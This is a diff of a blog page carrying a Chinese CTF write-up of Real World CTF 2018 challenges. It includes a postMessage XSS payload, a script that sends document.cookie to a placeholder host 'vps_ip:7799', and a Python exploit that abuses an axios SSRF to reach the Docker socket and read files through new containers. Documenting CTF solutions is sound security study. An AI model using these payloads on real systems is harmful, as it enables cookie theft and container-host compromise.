@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,51 +104,30 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>0x01 advertisement (check-in)</h2>
-
 <h3>Detail</h3>
-
 <p>This platform is under protection. DO NOT hack it.</p>
-
 <h3>Writeup</h3>
-
 <p>任意方式攻击平台导致403就能拿到Flag</p>
-
-<p><img src="https://img.virzz.com/15329659397442.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329659397442.jpg" /></p>
 <p>(忘了截图，偷来的)</p>
-
-<p><strong>Flag : rwctf{SafeLine<em>1s</em>watch1ng_uuu}</strong></p>
-
+<p><strong>Flag : rwctf{SafeLine_1s_watch1ng_uuu}</strong></p>
 <h2>0x02 dot free (Web)</h2>
-
 <h3>Detail</h3>
-
 <p>All the IP addresses and domain names have dots, but can you hack without dot?</p>
-
 <p>http://13.57.104.34/</p>
-
 <h3>Writeup</h3>
-
 <p>提交url数组导致报错，根据Debug信息，推测为XSS题目</p>
-
-<p><img src="https://img.virzz.com/15329662524552.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329662524552.jpg" /></p>
 <p>并暴露部分代码</p>
-
-<p><img src="https://img.virzz.com/15329663083412.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329663083412.jpg" /></p>
 <p>尝试XSS后不成功，Fuzz后发生意外，非预期</p>
-
-<p><img src="https://img.virzz.com/15329663698969.jpg" alt=""></p>
-
-<hr>
-
+<p><img alt="" src="https://img.virzz.com/15329663698969.jpg" /></p>
+<hr />
 <p>右键查看源码可见</p>
-
-<pre><code class="language-javascript">function lls(src) {
-    var el = document.createElement(&#39;script&#39;);
+<pre><code class="javascript">function lls(src) {
+    var el = document.createElement('script');
     if (el) {
-        el.setAttribute(&#39;type&#39;, &#39;text/javascript&#39;);
+        el.setAttribute('type', 'text/javascript');
         el.src = src;
         document.body.appendChild(el);
     }
@@ -158,11 +145,11 @@ function lce(doc, def, parent) {
     if (parent) parent.appendChild(el);
     return el;
 };
-window.addEventListener(&#39;message&#39;, function (e) {
+window.addEventListener('message', function (e) {
     if (e.data.iframe) {
-        if (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf(&#39;.&#39;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;//&quot;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;。&quot;) == -1 &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != &#39;object&#39;)) {
+        if (e.data.iframe &amp;&amp; e.data.iframe.value.indexOf('.') == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;//&quot;) == -1 &amp;&amp; e.data.iframe.value.indexOf(&quot;。&quot;) == -1 &amp;&amp; e.data.iframe.value &amp;&amp; typeof(e.data.iframe != 'object')) {
             if (e.data.iframe.type == &quot;iframe&quot;) {
-                lce(doc, [&#39;iframe&#39;, &#39;width&#39;, &#39;0&#39;, &#39;height&#39;, &#39;0&#39;, &#39;src&#39;, e.data.iframe.value], parent);
+                lce(doc, ['iframe', 'width', '0', 'height', '0', 'src', e.data.iframe.value], parent);
             } else {
                 lls(e.data.iframe.value)
             }
@@ -170,97 +157,75 @@ window.addEventListener(&#39;message&#39;, function (e) {
     }
 }, false);
 window.onload = function (ev) {
-    postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), &#39;*&#39;)
+    postMessage(JSON.parse(decodeURIComponent(location.search.substr(1))), '*')
 }
 </code></pre>
 
 <p>获取<code>location.search</code>内容解析JSON并发送<code>message</code>事件，然后据其添加一个<code>iframe</code></p>
-
 <p>然后需要绕过</p>
-
 <ul>
-<li><code>e.data.iframe.value.indexOf(&#39;.&#39;) == -1</code></li>
-<li><code>e.data.iframe.value.indexOf(&quot;//&quot;) == -1</code></li>
-<li><code>e.data.iframe.value.indexOf(&quot;。&quot;) == -1</code></li>
-<li><code>typeof(e.data.iframe != &#39;object&#39;)</code></li>
+<li><code>e.data.iframe.value.indexOf('.') == -1</code></li>
+<li><code>e.data.iframe.value.indexOf("//") == -1</code></li>
+<li><code>e.data.iframe.value.indexOf("。") == -1</code></li>
+<li><code>typeof(e.data.iframe != 'object')</code></li>
 </ul>
-
 <p>即构造十进制ip，web服务默认索引为index.php</p>
-
-<pre><code class="language-php">&lt;?php
+<pre><code class="php">&lt;?php
 header(&quot;Content-type: text/javascript&quot;);
 ?&gt;
 var c = escape(document.cookie);
-location.href = &#39;http://vps_ip:7799/?cookie=&#39;+c;
+location.href = 'http://vps_ip:7799/?cookie='+c;
 </code></pre>
 
 <p><strong>Payload :</strong> <code>http://13.57.104.34/?%7B%22iframe%22:%7B%22value%22:%22%5C%5C%5C%5Cvps_ip_to_dec:7799%22%7D%7D</code></p>
-
-<p><img src="https://img.virzz.com/15329684905554.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329684905554.jpg" /></p>
 <p><strong>Flag : rwctf{L00kI5TheFlo9}</strong></p>
-
 <h2>0x03 BookHub (web)</h2>
-
 <p>比较有意思，拿出来发单篇</p>
-
 <blockquote>
 <p>详见<a href="/2018/07/30/bookhub_for_rwctf2018_writeups.html">BookHub Writeup - Real World CTF 2018</a></p>
 </blockquote>
-
 <h2>0x04 PrintMD (web) 复现</h2>
-
 <blockquote>
-<p><a href="https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup">RealWorldCTF PrintMD writeup -- CurseRed</a></p>
+<p><a href="https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup">RealWorldCTF PrintMD writeup &ndash; CurseRed</a></p>
 </blockquote>
-
 <h3>Detail</h3>
-
 <p>Make HackMD printable ._. http://54.183.55.10/</p>
-
 <p>Hint: If you are not skilled at black-box testing, you need to figure out how PrintMD is compatible with outdated browsers. Flag is in the filesystem /flag</p>
-
 <p>Hint: Here is a render.js for you.</p>
+<p><strong>render.js</strong></p>
+<pre><code class="javascript">const {Router} = require('express')
+const {matchesUA} = require('browserslist-useragent')
+const router = Router()
+const axios = require('axios')
+const md = require('../../plugins/md_srv')
 
-<p><strong>render.js</strong><br>
-```javascript<br>
-const {Router} = require(&#39;express&#39;)<br>
-const {matchesUA} = require(&#39;browserslist-useragent&#39;)<br>
-const router = Router()<br>
-const axios = require(&#39;axios&#39;)<br>
-const md = require(&#39;../../plugins/md_srv&#39;)</p>
-
-<p>router.post(&#39;/render&#39;, function (req, res, next) {<br>
-  let ret = {}<br>
-  ret.ssr = !matchesUA(req.body.ua, {<br>
-    browsers: [&quot;last 1 version&quot;, &quot;&gt; 1%&quot;, &quot;IE 10&quot;],<br>
-    _allowHigherVersions: true<br>
-  });<br>
-  if (ret.ssr) {<br>
-    axios(req.body.url).then(r =&gt; {<br>
-          ret.mdbody = md.render(r.data)<br>
-      res.json(ret)<br>
-    })<br>
-  }<br>
-  else {<br>
-    ret.mdbody = md.render(&#39;# 请稍候…&#39;)<br>
-    res.json(ret)<br>
-  }<br>
-});<br>
-module.exports = router<br>
-```</p>
+router.post('/render', function (req, res, next) {
+  let ret = {}
+  ret.ssr = !matchesUA(req.body.ua, {
+    browsers: [&quot;last 1 version&quot;, &quot;&gt; 1%&quot;, &quot;IE 10&quot;],
+    _allowHigherVersions: true
+  });
+  if (ret.ssr) {
+    axios(req.body.url).then(r =&gt; {
+          ret.mdbody = md.render(r.data)
+      res.json(ret)
+    })
+  }
+  else {
+    ret.mdbody = md.render('# 请稍候…')
+    res.json(ret)
+  }
+});
+module.exports = router
+</code></pre>
 
 <h3>Writeup</h3>
-
 <p>服务器通过判断<code>User-Agent</code>是否在服务端抓取并解析markdown文档。</p>
-
 <p><em>这个地方很尴尬，在控制台发现了xhr下载操作../download，并看了print.ba84889093b992d33112.js但是却没有细看其中的逻辑，看的时候render.js提示还没有放出来，然后也就忘记了/api/render这个操作，无可救药了</em></p>
-
 <p><em>然后在看到render.js的时候，误以为是md_srv解析器RCE漏洞，webin太多以至于走火入魔了</em></p>
-
 <p>然后在<strong>print.ba84889093b992d33112.js</strong>中可以找到将markdown文档发送到服务端解析的代码</p>
-
-<pre><code class="language-javascript">validate: function(e) {
+<pre><code class="javascript">validate: function(e) {
     return e.query.url &amp;&amp; e.query.url.startsWith(&quot;https://hackmd.io/&quot;)
 },
 asyncData: function(ctx) {
@@ -285,24 +250,15 @@ mounted: function() {
 </code></pre>
 
 <p>回顾<strong>render.js</strong>，可知，可以通过HTTP参数<code>ctx.query</code>污染后在传递到后端<code>axios(req.body.url)</code></p>
-
 <p>因此，这个地方存在一个SSRF漏洞，但是<strong>axios</strong>这个东西是不支持<strong>file://</strong>协议的，但是通过文档可知，他支持<strong>UNIX Socket</strong>，并给出一个例子<code>/var/run/docker.sock</code>。</p>
-
-<p><img src="https://img.virzz.com/15329752604803.jpg" alt=""></p>
-
+<p><img alt="" src="https://img.virzz.com/15329752604803.jpg" /></p>
 <p>Ping一波就成功返回<strong>OK</strong></p>
-
 <p>也就是说可以通过<strong>axios</strong>进行对<strong>Docker</strong>的未授权访问！！！</p>
-
 <p>通过<strong>Docker Remote API</strong>，我们可以尽情愉快玩耍！！！</p>
-
-<p><img src="https://img.virzz.com/15329756056072.jpg" alt=""></p>
-
-<p><strong>Flag : rwctf{a<em>journey</em>from<em>ssr</em>to<em>ssrf</em>PogChamp}</strong></p>
-
+<p><img alt="" src="https://img.virzz.com/15329756056072.jpg" /></p>
+<p><strong>Flag : rwctf{a_journey_from_ssr_to_ssrf_PogChamp}</strong></p>
 <h3>exp.py</h3>
-
-<pre><code class="language-python">import requests as req
+<pre><code class="python">import requests as req
 import random
 import string
 from bs4 import BeautifulSoup
@@ -327,27 +283,26 @@ def get(u):
 
 
 def fuck(_u):
-    _u += &#39;&amp;url[socketPath]=/var/run/docker.sock&#39;
+    _u += '&amp;url[socketPath]=/var/run/docker.sock'
     pl = URL.format(url=_u)
     try:
         get(pl)
     except:
         pass
 
-if __name__ == &#39;__main__&#39;:
-    container_name = &#39;&#39;.join(random.sample(
+if __name__ == '__main__':
+    container_name = ''.join(random.sample(
         string.ascii_letters + string.digits, 6))
     _us = [
-        &#39;url[url]=/_ping&amp;&#39;,
-        &#39;url[method]=post&amp;url[url]=http://127.0.0.1/images/create?fromImage=alpine:latest&#39;,
-        &#39;url[method]=post&amp;url[url]=http://127.0.0.1/containers/create?name=%s&amp;url[data][Image]=alpine:latest&amp;url[data][Volumes][flag][path]=/getflag&amp;url[data][Binds][]=/flag:/getflag:ro&amp;url[data][Entrypoint][]=/bin/ls&#39; % container_name,
-        &#39;url[method]=post&amp;url[url]=http://127.0.0.1/containers/%s/start&#39; % container_name,
-        &#39;url[method]=get&amp;url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag&#39; % container_name
+        'url[url]=/_ping&amp;',
+        'url[method]=post&amp;url[url]=http://127.0.0.1/images/create?fromImage=alpine:latest',
+        'url[method]=post&amp;url[url]=http://127.0.0.1/containers/create?name=%s&amp;url[data][Image]=alpine:latest&amp;url[data][Volumes][flag][path]=/getflag&amp;url[data][Binds][]=/flag:/getflag:ro&amp;url[data][Entrypoint][]=/bin/ls' % container_name,
+        'url[method]=post&amp;url[url]=http://127.0.0.1/containers/%s/start' % container_name,
+        'url[method]=get&amp;url[url]=http://127.0.0.1/containers/%s/archive?path=/getflag' % container_name
     ]
     for i in _us:
         fuck(i)
 </code></pre>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2018/07/31/real_world_ctf_2018_some_writeup.html" target="_blank">Real World CTF (RWCTF) 2018 部分 Writeup</a><br />
